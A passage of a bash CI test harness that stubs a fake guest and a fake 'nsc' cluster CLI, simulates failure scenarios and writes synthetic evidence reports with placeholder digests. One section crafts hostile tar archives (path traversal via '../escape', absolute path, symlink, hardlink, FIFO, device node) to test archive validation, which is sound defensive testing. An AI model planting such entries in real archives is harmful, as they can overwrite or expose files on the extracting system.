jq -n --arg digest "$demo_pack_digest" '
  {apiVersion:"diene.atomi.cloud/ci-vendors/v1",actions:[{
    componentClass:"K9",actionId:"demo-vendor",permissionRule:"ditto-vendor-demo",
    profile:"ditto",buildMode:"build-local",required:false,
    fixturePack:{id:"demo",version:"1.0.0",digest:$digest},account:"sandbox-demo",
    endpoint:"https://vendor.example.test",credentialEnv:"DIENE_VENDOR_CREDENTIAL",
    credentialWriter:"github-environment",
    egress:[{dns:"vendor.example.test",sni:"vendor.example.test",port:443,methods:["GET","POST","DELETE"]}],
    setup:["/bin/true"],probe:["/bin/true"],cleanup:["/bin/true"],absence:["/bin/true"],
    timeoutSeconds:60,retryAttempts:0,callbackCompletion:"poll"}]}' \
  >"$work/.diene/ci/vendors.v1.yaml"

cat >"$work/.diene/ci/environment-lock.v1.json" <<'JSON'
{
  "apiVersion":"diene.atomi.cloud/environment-lock/v1",
  "profiles":{
    "lapras":{"substrate":"k3d"},"ditto":{"substrate":"k3d"},
    "rotom":{"substrate":"k3d"},"absol":{"substrate":"k3d"},
    "eevee":{"substrate":"entei-vcluster"},"castform":{"substrate":"entei-vcluster"}
  },
  "previewManifest":{
    "schemaVersion":"preview-manifest/v1",
    "schemaDigest":"sha256:3333333333333333333333333333333333333333333333333333333333333333",
    "wordListVersion":"v1"
  },
  "operator":{"kind":"operator","version":"1.0.0"}
}
JSON

source_archive=$scratch/source.tar
make_source_archive() {
  tar -cf "$source_archive" -C "$work" scripts schemas .diene .github
  chmod 0600 "$source_archive"
}
make_source_archive

hostile_archive_dir=$scratch/hostile-source-archives
hostile_archive_stage=$scratch/hostile-source-stage
install -d -m 0700 "$hostile_archive_dir" "$hostile_archive_stage"
printf '%s\n' hostile >"$hostile_archive_stage/payload"
ln -s payload "$hostile_archive_stage/symlink"
ln "$hostile_archive_stage/payload" "$hostile_archive_stage/hardlink"
mkfifo "$hostile_archive_stage/fifo"
for hostile_kind in traversal absolute symlink hardlink fifo device; do
  cp "$source_archive" "$hostile_archive_dir/$hostile_kind.tar"
done
tar -rf "$hostile_archive_dir/traversal.tar" --transform='s|^payload$|../escape|' \
  -C "$hostile_archive_stage" payload 2>/dev/null
tar -rf "$hostile_archive_dir/absolute.tar" --transform='s|^payload$|/absolute|' \
  -C "$hostile_archive_stage" payload 2>/dev/null
tar -rf "$hostile_archive_dir/symlink.tar" -C "$hostile_archive_stage" symlink
tar -rf "$hostile_archive_dir/hardlink.tar" -C "$hostile_archive_stage" payload hardlink
tar -rf "$hostile_archive_dir/fifo.tar" -C "$hostile_archive_stage" fifo
tar -rf "$hostile_archive_dir/device.tar" -P --transform='s|^/dev/null$|device|' /dev/null
chmod 0600 "$hostile_archive_dir"/*.tar

write_subject() {
  local target=${1:?subject target required}
  local run_id=${2:?run id required}
  local run_attempt=${3:?run attempt required}
  jq -n --arg sha "$SOURCE_SHA" --arg digest "$ARTIFACT_DIGEST" \
    --arg workflow "$WORKFLOW_REF" --arg runId "$run_id" --arg runAttempt "$run_attempt" \
    --arg attestation "$ATTESTATION_DIGEST" --arg closure "$CLOSURE_DIGEST" \
    --arg closureSignature "$CLOSURE_SIGNATURE_DIGEST" --arg closureRoot "$CLOSURE_ROOT_DIGEST" '
    {apiVersion:"diene.atomi.cloud/ci-artifact-subject/v1",sourceSha:$sha,
     artifact:{imageRef:("ghcr.io/atomicloud/example@"+$digest),digest:$digest,registry:"ghcr.io",private:true,
       producer:{workflowRef:$workflow,runId:$runId,runAttempt:$runAttempt}},
     provenance:{predicateType:"https://slsa.dev/provenance/v1",
       provenanceRef:("oci://ghcr.io/atomicloud/example/provenance/"+$sha),
       attestationDigest:$attestation,workflowRef:$workflow,runId:$runId,runAttempt:$runAttempt,
       pullIdentity:"AtomiCloud/example-selected-package-reader"},
     closure:{bundleRef:("oci://ghcr.io/atomicloud/example/closure/"+$sha),digest:$closure,
       signatureBundleDigest:$closureSignature,trustRootDigest:$closureRoot}}' >"$target"
  chmod 0600 "$target"
}

# The synthetic fake guest proves only the outer Namespace lifecycle. It
# produces the fixed archive the real orchestrator downloads, and the real
# outer code validates, augments, leakage-scans, schemas, destroys, proves
# absence, and seals it. It is deliberately not inner-driver evidence.
fake_guest=$scratch/fake-guest
cat >"$fake_guest" <<'GUEST'
#!/usr/bin/env bash
set -euo pipefail
state=${1:?guest state required}
cluster_id=${2:?cluster id required}
scenario=${FAKE_NSC_SCENARIO:-happy}
[[ -d $state/source ]] || exit 64
install -d -m 0700 "$state/evidence" "$state/out"
inputs=$state/inputs.json
receipt=$state/receipt.json
evidence=$state/evidence

# The fake guest may not manufacture a runtime version of its own. Its reported
# k3s/Kubernetes facts come from the admitted input, and the feature the outer
# create actually selected must agree with that same admitted minor. Without
# this cross-check the harness could stay green while production created a
# platform-default substrate.
admitted_k3s=$(jq -er '.admittedK3sVersion' "$inputs")
[[ $admitted_k3s =~ ^v([0-9]+)\.([0-9]+)\.[0-9]+\+k3s[0-9]+$ ]] || exit 68
admitted_feature=kubernetes:${BASH_REMATCH[1]}.${BASH_REMATCH[2]}
create_metadata=${FAKE_NSC_ROOT:?}/instances/$cluster_id/meta.json
[[ -f $create_metadata ]] || exit 68
[[ $(jq -er '.kubernetes_feature' "$create_metadata") == "$admitted_feature" ]] || exit 68
[[ $(jq -er '.labels["nsc.kubernetes"]' "$create_metadata") == "${admitted_feature#kubernetes:}" ]] || exit 68

# shellcheck disable=SC1091
source "${TEMPLATE_SCRIPT_DIR:?}/environment-lib.sh"

guest_nix_contract=$(jq -ce '.guestNix' "$inputs")
guest_nix_evidence=$evidence/guest-nix
install -d -m 0700 "$guest_nix_evidence"
guest_nix_config_digest=8888888888888888888888888888888888888888888888888888888888888888
printf '%s\n' 'inheritedNixFamily=none' 'profileNixVar=NIX_PROFILES' \
  'profileNixVar=NIX_SSL_CERT_FILE' 'home=/run/diene-ci/home' \
  'xdgConfigHome=/run/diene-ci/home/.config' \
  'userConfFiles=/run/diene-ci/nix-user.conf' \
  "etcNixConf=$guest_nix_config_digest" >"$guest_nix_evidence/environment.txt"
chmod 0600 "$guest_nix_evidence/environment.txt"
guest_nix_environment_digest=$(diene_file_digest "$guest_nix_evidence/environment.txt")
guest_nix_identity=$(jq -Scn --argjson contract "$guest_nix_contract" \
  --arg storePath /nix/store/synthetic-determinate/bin/nix \
  --arg storePathDigest sha256:7777777777777777777777777777777777777777777777777777777777777777 \
  --arg installedCopyDigest "$(jq -r '.payloadDigest' <<<"$guest_nix_contract")" \
  --arg environmentDigest "$guest_nix_environment_digest" '
  $contract + {storePath:$storePath,storePathDigest:$storePathDigest,
    installedCopyDigest:$installedCopyDigest,environmentDigest:$environmentDigest,
    profileSourced:true}')
printf '%s\n' "$guest_nix_identity" | diene_write_json "$guest_nix_evidence/identity.json"
guest_nix_receipt_digest=$(diene_file_digest "$guest_nix_evidence/identity.json")
guest_nix_preflight=$(jq -c --arg digest "$guest_nix_receipt_digest" \
  '. + {identityReceiptDigest:$digest}' "$guest_nix_evidence/identity.json")

# Stage 0 is real in the pinned-Wolfi rail; here the synthetic guest only has
# to carry the same bound shape so the outer lifecycle proves collection,
# leakage scanning, and checkpoint binding of the toolchain evidence class.
guest_toolchain_contract=$(jq -ce '.guestToolchain' "$inputs")
guest_toolchain_evidence=$evidence/gnu-toolchain
install -d -m 0700 "$guest_toolchain_evidence"
{
  printf '%s\n' "executionMode=$(jq -r '.executionMode' <<<"$guest_toolchain_contract")"
  jq -r '.packages[] | "\(.name) \(.version) \(.bytes) \(.digest)"' <<<"$guest_toolchain_contract"
} >"$guest_toolchain_evidence/pins.txt"
printf '%s\n' 'OK: 26 MiB in 25 packages' >"$guest_toolchain_evidence/install.log"
printf '%s|%s|%s|%s \n%s\n' sed /usr/bin/sed /usr/bin/sed '(GNU sed)' tarImplementation=busybox \
  >"$guest_toolchain_evidence/identity.txt"
chmod 0600 "$guest_toolchain_evidence/pins.txt" "$guest_toolchain_evidence/install.log" \
  "$guest_toolchain_evidence/identity.txt"
guest_toolchain_identity=$(jq -Scn --argjson contract "$guest_toolchain_contract" \
  --arg contractDigest "$(diene_guest_toolchain_contract_digest)" \
  --arg pinsDigest "$(diene_file_digest "$guest_toolchain_evidence/pins.txt")" \
  --arg installLogDigest "$(diene_file_digest "$guest_toolchain_evidence/install.log")" \
  --arg stageIdentityDigest "$(diene_file_digest "$guest_toolchain_evidence/identity.txt")" '
  $contract + {contractDigest:$contractDigest,absolutePathIdentity:true,
    sha256sumCheckBehavior:true,sedInPlaceBehavior:true,tarImplementation:"busybox",
    tarResolvedPath:"/usr/bin/busybox",tarPortableFlags:["-cf","-tf","-tvf","-xf","-C","-f"],
    tarTypeCharacter:"-",pinsDigest:$pinsDigest,installLogDigest:$installLogDigest,
    stageIdentityDigest:$stageIdentityDigest}')
printf '%s\n' "$guest_toolchain_identity" | diene_write_json "$guest_toolchain_evidence/identity.json"
guest_toolchain_preflight=$(jq -c \
  --arg digest "$(diene_file_digest "$guest_toolchain_evidence/identity.json")" \
  '. + {identityReceiptDigest:$digest}' "$guest_toolchain_evidence/identity.json")

install -d -m 0700 "$evidence/staging/orchestration"
printf '%s\n' 'ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242' \
  >"$evidence/staging/orchestration/ss-observation.txt"
chmod 0600 "$evidence/staging/orchestration/ss-observation.txt"
socket_digest=$(diene_file_digest "$evidence/staging/orchestration/ss-observation.txt")
jq -n --arg digest "$socket_digest" '
  {orchestrationTupleSource:"kernel-ss",orchestrationFlowCount:1,
   orchestrationSelectedRow:"ESTAB 0 0 10.0.0.2:22 192.0.2.10:4242",
   orchestrationObservationDigest:$digest,
   orchestrationObservationArtifact:"orchestration/ss-observation.txt"}' \
  >"$evidence/policy.json"
chmod 0600 "$evidence/policy.json"

jq -n --arg cluster "$cluster_id" --arg k3s "$admitted_k3s" \
  --argjson guestNix "$guest_nix_preflight" \
  --argjson guestToolchain "$guest_toolchain_preflight" '
  {outcome:"Pass",reasonCode:"NamespaceWolfiBuiltInK3sReady",clusterId:$cluster,
   identitySource:"cidfile-metadata-exact-id-ssh",os:{id:"wolfi",version:"rolling",uid:0},
   k3s:{version:$k3s,kubernetesVersion:$k3s,nodeCount:1,
        capacity:{cpu:"16",memory:"32Gi"}},
   network:{podCidrs:["10.142.0.0/16"],serviceCidrs:["10.143.0.0/16"],ipv6Disabled:false,
            namespaceIngress:false,publicBinding:false},storage:{defaultClass:"local-path"},
   policyBackend:{mechanism:"iptables",backend:"nf_tables",version:"iptables v1.8.13 (nf_tables)"},
   guestNix:$guestNix,guestToolchain:$guestToolchain,
   cacheAttached:false,platformStatus:"platform per-instance policy pending (support ask #4)"}' \
  >"$evidence/preflight.json"
chmod 0600 "$evidence/preflight.json"
jq -e --arg digest "$guest_nix_receipt_digest" --slurpfile identity "$guest_nix_evidence/identity.json" '
  (.guestNix | del(.identityReceiptDigest)) == $identity[0] and
  .guestNix.identityReceiptDigest == $digest
' "$evidence/preflight.json" >/dev/null
diene_require_guest_toolchain_preflight_agreement "$evidence/preflight.json" \
  "$guest_toolchain_evidence/identity.json"

input_digest=$(diene_sha256_text "$(jq -cS . "$inputs")")
diene_checkpoint_init "$evidence/checkpoint-chain.json" "$input_digest"
diene_checkpoint_append "$evidence/checkpoint-chain.json" instance-preflight Pass \
  "$(diene_file_digest "$evidence/preflight.json")" false
if [[ $scenario == checkpoint-resumed ]]; then
  diene_checkpoint_append "$evidence/checkpoint-chain.json" resumed-readiness Pass \
    "$(diene_sha256_text "$cluster_id|resumed-readiness")" true
  diene_checkpoint_append "$evidence/checkpoint-chain.json" final-clean-pass Pass \
    "$(diene_sha256_text "$cluster_id|final-clean-pass")" false
  diene_checkpoint_seal "$evidence/checkpoint-chain.json" false
elif [[ $scenario == checkpoint-no-final ]]; then
  diene_checkpoint_append "$evidence/checkpoint-chain.json" environment-ready Pass \
    "$(diene_sha256_text "$cluster_id|environment-ready")" false
  diene_checkpoint_seal "$evidence/checkpoint-chain.json" false
else
  diene_checkpoint_append "$evidence/checkpoint-chain.json" final-clean-pass Pass \
    "$(diene_sha256_text "$cluster_id|final-clean-pass")" false
  diene_checkpoint_seal "$evidence/checkpoint-chain.json" true
fi
if [[ $scenario == checkpoint-broken ]]; then
  jq '.checkpoints[0].predecessorDigest = "sha256:9999999999999999999999999999999999999999999999999999999999999999"' \
    "$evidence/checkpoint-chain.json" >"$evidence/checkpoint-chain.json.tmp"
  mv "$evidence/checkpoint-chain.json.tmp" "$evidence/checkpoint-chain.json"
fi

jq -n '[
  {id:"preexisting-flow-transition-denial",outcome:"Pass",reasonCode:"NoGrandfatheredExternalFlow",required:true},
  {id:"host-metadata-denial",outcome:"Pass",reasonCode:"ConnectionRefused",required:true},
  {id:"host-arbitrary-https-denial",outcome:"Pass",reasonCode:"ConnectionRefused",required:true},
  {id:"pod-metadata-denial",outcome:"Pass",reasonCode:"ForwardRefused",required:true},
  {id:"pod-arbitrary-https-denial",outcome:"Pass",reasonCode:"ForwardRefused",required:true},
  {id:"pod-dns-denial",outcome:"Pass",reasonCode:"ForwardRefused",required:true}
]' >"$evidence/hostile-probes.json"

lane=$(jq -r '.lane' "$inputs")
profile=ditto
mode=build-local
profile_id=ditto-build-local-v1
case $lane in
  ditto-target-pull) mode=target-pull; profile_id=ditto-target-pull-v1 ;;
  ditto-vendor) profile_id=ditto-vendor-v1 ;;
  absol) profile=absol; profile_id=absol-hermetic-v1 ;;
  fleet-independence) profile_id=fleet-independence-v1 ;;
esac
allocation=$(jq -r '.owner.allocationKey' "$receipt")
generation=$(jq -r '.owner.generationKey' "$receipt")
receipt_id=$(jq -r '.owner.receiptId' "$receipt")
journey_digest="sha256:$(sha256sum "$state/source/.diene/ci/journeys.v1.yaml" | awk '{print $1}')"
vendor_digest="sha256:$(sha256sum "$state/source/.diene/ci/vendors.v1.yaml" | awk '{print $1}')"

jq -n --arg profile "$profile" --arg allocation "$allocation" '
  def leaf($id;$required):
    if $required then {id:$id,outcome:"Pass",required:true,reasonCode:"Converged",
      sourceUid:("uid-"+$id),observedGeneration:1,allocationKey:$allocation,
      transitionTime:"2026-07-31T00:00:00Z"}
    else {id:$id,outcome:"NotRequired",required:false,reasonCode:"NotApplicableToLane"} end;
  {apiVersion:"diene-readiness/v1",profile:$profile,aggregate:"EnvironmentReady",outcome:"Pass",
   readiness:[leaf("SubstrateReady";true),leaf("SeedReady";true),leaf("StoreReady";true),
    leaf("ExternalSecretsReady";true),leaf("DependenciesReady";true),leaf("PVCsReady";true),
    leaf("MigrationsReady";true),leaf("FixturesReady";true),leaf("LogtoReady";true),
    leaf("ArtifactPullReady";true),leaf("ApplicationWorkloadsReady";true),
    leaf("ExposurePrerequisitesReady";true),leaf("ExposureReady";true),leaf("EnvironmentReady";true),
    leaf("AllocationReady";false),leaf("CastformProdSafetyReady";false),leaf("CallbackReady";false)]}' \
  >"$evidence/readiness.json"

report_outcome=Pass
report_reason=''
driver_exit=0
if [[ $scenario == driver-fail ]]; then
  report_outcome=Fail
  report_reason=JourneyFailed
  driver_exit=64
fi

if [[ $lane == ditto-vendor ]]; then
  required=$(jq -r --arg id "$(jq -r '.selectors.actionId' "$inputs")" \
    '.actions[] | select(.actionId == $id) | .required' "$state/source/.diene/ci/vendors.v1.yaml")
  vendor_outcome=Pass
  vendor_reason=AssertionsSatisfied
  if [[ $scenario == vendor-unavailable ]]; then
    vendor_outcome=Unavailable
    vendor_reason=ProviderUnavailable
    report_outcome=Unavailable
    report_reason=ProviderUnavailable
  fi
  jq -n --arg revision "$(jq -r '.owner.sourceSha' "$inputs")" \
    --arg runId "$(jq -r '.owner.runId' "$inputs")" --arg runAttempt "$(jq -r '.owner.runAttempt' "$inputs")" \
    --arg workflow "$(jq -r '.owner.workflowRef' "$inputs")" --arg action "$(jq -r '.selectors.actionId' "$inputs")" \
    --arg receipt "$receipt_id" --arg allocation "$allocation" --arg generation "$generation" \
    --arg cluster "$cluster_id" --arg garden "$(jq -r '.gardenLockDigest' "$inputs")" \
    --arg nscVersion "$(jq -r '.nscVersion' "$inputs")" \
    --arg nscArtifactDigest "$(jq -r '.nscArtifactDigest' "$inputs")" \
    --arg nscBinaryDigest "$(jq -r '.nscBinaryDigest' "$inputs")" \
    --arg k3s "$admitted_k3s" \
    --arg vendorDigest "$vendor_digest" --arg vendorOutcome "$vendor_outcome" \
    --arg vendorReason "$vendor_reason" --arg reportOutcome "$report_outcome" --arg reportReason "$report_reason" \
    --argjson required "$required" --slurpfile probes "$evidence/hostile-probes.json" \
    --slurpfile chain "$evidence/checkpoint-chain.json" '
    {apiVersion:"diene.atomi.cloud/ci-vendor-report/v1",repositoryRevision:$revision,
     workflow:{runId:$runId,runAttempt:$runAttempt,workflowRef:$workflow},lane:"ditto-vendor",
     profile:"ditto",buildMode:"build-local",actionId:$action,componentClass:"K9",
     permissionRule:"ditto-vendor-demo",receiptId:$receipt,
     instance:{allocationKey:$allocation,generationKey:$generation,substrateName:("diene-"+$allocation),
       clusterId:$cluster,osId:"wolfi",osVersion:"rolling",k3sVersion:$k3s,
       kubernetesVersion:$k3s,nodeCount:1,capacity:{cpu:"16",memory:"32Gi"}},
     tooling:{gardenLockDigest:$garden,journeyManifestDigest:$vendorDigest,nscVersion:$nscVersion,
       nscArtifactDigest:$nscArtifactDigest,nscBinaryDigest:$nscBinaryDigest,
       sourceArchiveDigest:"sha256:4444444444444444444444444444444444444444444444444444444444444444",
       artifactSubjectDigest:"sha256:5555555555555555555555555555555555555555555555555555555555555555"},
     vendorOutcome:{id:$action,outcome:$vendorOutcome,reasonCode:$vendorReason,required:$required,durationSeconds:1},
     providerCleanup:{outcome:"Pass",reasonCode:"ProviderObjectsAbsent",objectIds:[],absenceProven:true,
       durableDebtRecord:null},credential:{issuer:"approved-environment-phase-broker",masked:true,
       issuedAfterReadiness:true,removed:true,removalObserved:true},
     evidence:{leakageScan:{outcome:"Pass",reasonCode:"ScanPendingFinalisation",encodings:[],scannedPaths:[]},
       egressCanary:{outcome:"Pass",reasonCode:"HostAndPodNegativeProbesPassed",mode:"allowlist",
         profileId:"ditto-vendor-v1",enforcement:"interim-in-guest-iptables-nft",
         platformStatus:"platform per-instance policy pending (support ask #4)",hostileProbes:$probes[0]},
       shipment:{outcome:"Unavailable",reasonCode:"CollectedByOuterOrchestrator"}},
     teardown:{outcome:"Pass",reasonCode:"ExactReceiptDestroyed",transitions:["ProviderCleanup:Pass","GardenAndPolicyCleanup:Pass"],
       finalizerWaitSeconds:0,debt:[],absenceProof:"ReceiptDestroyed"},checkpointChain:$chain[0],
     timings:{setupSeconds:1,substrateSeconds:1,readinessSeconds:1,journeysSeconds:1,teardownSeconds:1},
     outcome:$reportOutcome} + (if $reportReason == "" then {} else {reasonCode:$reportReason} end)' \
    >"$evidence/vendor-report.driver.json"
else
  jq -n --arg revision "$(jq -r '.owner.sourceSha' "$inputs")" \
    --arg runId "$(jq -r '.owner.runId' "$inputs")" --arg runAttempt "$(jq -r '.owner.runAttempt' "$inputs")" \
    --arg workflow "$(jq -r '.owner.workflowRef' "$inputs")" --arg lane "$lane" --arg profile "$profile" \
    --arg mode "$mode" --arg artifact "$(jq -r '.artifact.digest' "$inputs")" \
    --arg imageRef "$(jq -r '.artifact.imageRef' "$state/artifact-subject.json")" \
    --arg receipt "$receipt_id" --arg allocation "$allocation" --arg generation "$generation" \
    --arg cluster "$cluster_id" --arg garden "$(jq -r '.gardenLockDigest' "$inputs")" \
    --arg nscVersion "$(jq -r '.nscVersion' "$inputs")" \
    --arg nscArtifactDigest "$(jq -r '.nscArtifactDigest' "$inputs")" \
    --arg nscBinaryDigest "$(jq -r '.nscBinaryDigest' "$inputs")" \
    --arg k3s "$admitted_k3s" \
    --arg journey "$journey_digest" --arg profileId "$profile_id" --arg reportOutcome "$report_outcome" \
    --arg reportReason "$report_reason" --slurpfile readiness "$evidence/readiness.json" \
    --slurpfile probes "$evidence/hostile-probes.json" --slurpfile chain "$evidence/checkpoint-chain.json" '
    {apiVersion:"diene.atomi.cloud/ci-environment-report/v1",repositoryRevision:$revision,
     workflow:{runId:$runId,runAttempt:$runAttempt,workflowRef:$workflow},lane:$lane,profile:$profile,buildMode:$mode,
     subject:{artifactDigest:$artifact,imageRef:$imageRef,producerWorkflowRef:$workflow},
     instance:{allocationKey:$allocation,generationKey:$generation,substrateName:("diene-"+$allocation),
       clusterId:$cluster,osId:"wolfi",osVersion:"rolling",k3sVersion:$k3s,
       kubernetesVersion:$k3s,nodeCount:1,capacity:{cpu:"16",memory:"32Gi"}},receiptId:$receipt,
     tooling:{gardenLockDigest:$garden,journeyManifestDigest:$journey,nscVersion:$nscVersion,
       nscArtifactDigest:$nscArtifactDigest,nscBinaryDigest:$nscBinaryDigest,
       sourceArchiveDigest:"sha256:4444444444444444444444444444444444444444444444444444444444444444",
       artifactSubjectDigest:"sha256:5555555555555555555555555555555555555555555555555555555555555555"},
     readiness:$readiness[0],journeys:[],coverage:[],
     evidence:{leakageScan:{outcome:"Pass",reasonCode:"ScanPendingFinalisation",encodings:[],scannedPaths:[]},
       egressCanary:{outcome:"Pass",reasonCode:"HostAndPodNegativeProbesPassed",mode:(if $lane == "absol" or $lane == "fleet-independence" then "closure-denied-network" else "allowlist" end),
         profileId:$profileId,enforcement:"interim-in-guest-iptables-nft",
         platformStatus:"platform per-instance policy pending (support ask #4)",hostileProbes:$probes[0]},
       shipment:{outcome:"Unavailable",reasonCode:"CollectedByOuterOrchestrator"}},
     teardown:{outcome:"Pass",reasonCode:"ExactReceiptDestroyed",transitions:["GardenExactDown:Pass","InterimPolicyRemoved:Pass"],
       finalizerWaitSeconds:0,debt:[],absenceProof:"ReceiptDestroyed"},checkpointChain:$chain[0],
     timings:{setupSeconds:1,substrateSeconds:1,readinessSeconds:1,journeysSeconds:1,teardownSeconds:1},
     outcome:$reportOutcome} + (if $reportReason == "" then {} else {reasonCode:$reportReason} end)' \
    >"$evidence/core-report.driver.json"
fi

if [[ $scenario == receipt-mismatch ]]; then
  jq '.owner.runId = "999999"' "$receipt" >"$evidence/ci-receipt.json"
elif [[ $scenario == receipt-unpatched ]]; then
  cp "$receipt" "$evidence/ci-receipt.json"
else
  jq '
    .namespace.policy.applied = true |
    .namespace.policy.hostileProbes = "Pass" |
    .cleanup = {outcome:"Pass",reasonCode:"ExactReceiptDestroyed",debt:[]}
  ' "$receipt" >"$evidence/ci-receipt.json"
fi
if [[ $scenario == proof-fifo ]]; then
  mkfifo "$evidence/hostile-fifo"
elif [[ $scenario == proof-unreadable ]]; then
  printf '%s\n' unreadable >"$evidence/hostile-unreadable"
fi
jq -n --arg outcome "$([[ $driver_exit == 0 ]] && printf Pass || printf Fail)" \
  --arg reason "$([[ $driver_exit == 0 ]] && printf DriverCompleted || printf JourneyFailed)" \
  --argjson exitCode "$driver_exit" '{outcome:$outcome,reasonCode:$reason,exitCode:$exitCode}' \
  >"$evidence/driver-status.json"
if [[ $scenario == proof-unreadable ]]; then
  tar --mode=000 -cf "$state/out/proof.tar" -C "$state" evidence
else
  tar -cf "$state/out/proof.tar" -C "$state" evidence
fi
(cd "$state/out" && sha256sum proof.tar >proof.sha256)
GUEST
chmod 0755 "$fake_guest"

fake_nsc=$scratch/nsc
cat >"$fake_nsc" <<'NSC'
#!/usr/bin/env bash
set -euo pipefail
root=${FAKE_NSC_ROOT:?}
log=${FAKE_NSC_LOG:?}
scenario=${FAKE_NSC_SCENARIO:-happy}
install -d -m 0700 "$root/instances" "$root/stale"
fake_guest_nix_pinned_asset_valid() {
  local asset=${1:?asset required} sidecar=${2:?sidecar required}
  local expected_digest=${3:?digest required} expected_bytes=${4:?byte length required}
  local expected_line="${expected_digest#sha256:}  $asset"
  [[ -f $asset && ! -L $asset && -f $sidecar && ! -L $sidecar ]] &&
    [[ $(wc -c <"$asset") == "$expected_bytes" && $(wc -l <"$sidecar") == 1 ]] &&
    [[ $(sha256sum "$asset") == "$expected_line" && $(<"$sidecar") == "$expected_line" ]] &&
    sha256sum -c "$sidecar" >/dev/null 2>&1
}
printf '%q ' "$@" >>"$log"
printf '\n' >>"$log"
command=${1:-}
shift || true
case $command in
  version)
    (($# == 0)) || exit 127
    case $scenario in
      nsc-older) printf 'version v0.0.531\n' ;;
      nsc-newer) printf 'version v0.0.533\n' ;;
      *) printf 'version v0.0.532\n' ;;
    esac
    ;;
  create)
    ephemeral=false
    duration=
    wait_kube=false
    cidfile=
    metadata=
    output=
    purpose=
    unique_tag=
    labels=0
    # The measured platform admits the Kubernetes minor only through this one
    # feature selector. Anything else is a platform-default create, which is the
    # exact defect this fake must refuse rather than silently absorb.
    enable_count=0
    enable=
    while (($#)); do
      case $1 in
        --ephemeral) ephemeral=true; shift ;;
        --duration) duration=$2; shift 2 ;;
        --enable=*) enable_count=$((enable_count + 1)); enable=${1#--enable=}; shift ;;
        --wait_kube_system) wait_kube=true; shift ;;
        --cidfile) cidfile=$2; shift 2 ;;
        --output_json_to) metadata=$2; shift 2 ;;
        --output) output=$2; shift 2 ;;
        --purpose) purpose=$2; shift 2 ;;
        --unique_tag) unique_tag=$2; shift 2 ;;
        --label) labels=$((labels + 1)); shift 2 ;;
        --machine_type) shift 2 ;;
        *) printf 'fake nsc: unsupported create argument %s\n' "$1" >&2; exit 127 ;;
      esac
    done
    [[ $ephemeral == true && $duration == 2h && $wait_kube == true && $output == json &&
      -n $cidfile && -n $metadata && -n $purpose && -n $unique_tag && $labels -eq 3 ]] || exit 65
    if ((enable_count != 1)) || [[ $enable != kubernetes:1.33 ]]; then
      printf 'fake nsc: create requires exactly one --enable=kubernetes:1.33 (saw %s: %s)\n' \
        "$enable_count" "${enable:-none}" >&2
      exit 68
    fi
    [[ $scenario != create-fail ]] || exit 41
    id="cluster-$(printf '%s' "$unique_tag" | sha256sum | cut -c1-16)"
    instance="$root/instances/$id"
    install -d -m 0700 "$instance/fs"
    jq -n --arg id "$id" --arg tag "$unique_tag" --arg feature "$enable" \
      --arg minor "${enable#kubernetes:}" '
      {cluster_id:$id,unique_tag:$tag,kubernetes_feature:$feature,
       labels:{"nsc.kubernetes":$minor}}' >"$instance/meta.json"
    : >"$instance/live"
    install -d -m 0700 "$(dirname -- "$cidfile")" "$(dirname -- "$metadata")"
    if [[ $scenario == cid-mismatch ]]; then printf '%s\n' "${id}-wrong" >"$cidfile"; else printf '%s\n' "$id" >"$cidfile"; fi
    jq -n --arg id "$id" '{cluster_id:$id}' >"$metadata"
    jq -n --arg id "$id" '{cluster_id:$id,instance_id:("instance-"+$id)}'
    ;;
  instance)
    sub=${1:-}; shift || true
    case $sub in
      upload)
        id=${1:?}; local_path=${2:?}; remote_path=${3:?}; flag=${4:-}; (($# == 4)) || exit 127
        [[ $flag == --mkdir && -f $root/instances/$id/live ]] || exit 66
        [[ $scenario != transfer-fail ]] || exit 47
        target="$root/instances/$id/fs/${remote_path#/}"
        install -d -m 0700 "$(dirname -- "$target")"
        cp "$local_path" "$target"
        ;;
      download)
        id=${1:?}; remote_path=${2:?}; local_path=${3:?}; flag=${4:-}; (($# == 4)) || exit 127
        [[ $flag == --mkdir && -f $root/instances/$id/live ]] || exit 66
        [[ $scenario != collection-fail ]] || exit 43
        source_path="$root/instances/$id/fs/${remote_path#/}"
        [[ -f $source_path ]] || exit 44
        install -d -m 0700 "$(dirname -- "$local_path")"
        cp "$source_path" "$local_path"
        ;;
      *) exit 127 ;;
    esac
    ;;
  ssh)
    # The binding ruling is one noninteractive session per call: -T selects no
    # pseudo-terminal and the -- separator ends option parsing, so the reviewed
    # program can never be re-read as an nsc flag.
    id=${1:?}; flag=${2:-}; separator=${3:-}; remote_command=${4:-}; (($# == 4)) || exit 127
    [[ $flag == -T && $separator == -- && -n $remote_command &&
      -f $root/instances/$id/live ]] || exit 66
    # This invocation is already in the log, so the count is this attempt's
    # ordinal against this exact cluster.
    ssh_attempt=$(grep -Ec "^ssh ${id} -T -- " "$log" || true)
    # Unmarked scenarios must produce no ready marker at all, so they are
    # decided before the marker is emitted. Everything else emits the exact
    # marker as the first complete stdout line, exactly as the fixed remote
    # program's first observable statement does.
    case $scenario in
      ssh-unmarked-fail) exit 42 ;;
      ssh-unmarked-zero) exit 0 ;;
      ssh-start-timeout-once) ((ssh_attempt > 1)) || exit 124 ;;
      ssh-start-timeout-kill-once) ((ssh_attempt > 1)) || exit 137 ;;
      ssh-start-timeout-always) exit 124 ;;
      ssh-start-timeout-then-fail)
        ((ssh_attempt > 1)) || exit 124
        exit 42
        ;;
      ssh-preceding-output) printf '%s\n' 'preamble-before-marker' ;;
      ssh-partial-marker)
        printf '%s' 'DieneNscSshSessionReady:v1'
        exit 124
        ;;
      ssh-late-marker)
        # Stay silent through the whole watchdog, then emit the marker only
        # from the TERM handler while the stop helper is inside kill-after. A
        # marker produced after the deadline must never upgrade a
        # watchdog-killed attempt to ready. The sleep is backgrounded so Bash
        # can run the handler instead of deferring it until the child returns.
        if ((ssh_attempt == 1)); then
          trap 'printf "%s\n" "DieneNscSshSessionReady:v1"; exit 124' TERM
          sleep 120 &
          wait $! || true
          exit 0
        fi
        ;;
    esac
    printf '%s\n' 'DieneNscSshSessionReady:v1'
    case $scenario in
      ssh-fail) exit 42 ;;
      ssh-delay) sleep 3 ;;
      ssh-marked-timeout) exit 124 ;;
      ssh-marked-kill) exit 137 ;;
      ssh-preceding-output) exit 124 ;;
      ssh-hostile-signal)
        # Refuse to die on TERM so the stop helper must actually sit in its
        # fixed kill-after window; that window is where a second signal can
        # interrupt a handler that reset itself to the default disposition.
        trap '' TERM
        sleep 30
        exit 0
        ;;
    esac
    state="$root/instances/$id/fs/run/diene-ci"
    [[ $remote_command == *'sha256sum -c archive-validator.sha256'* &&
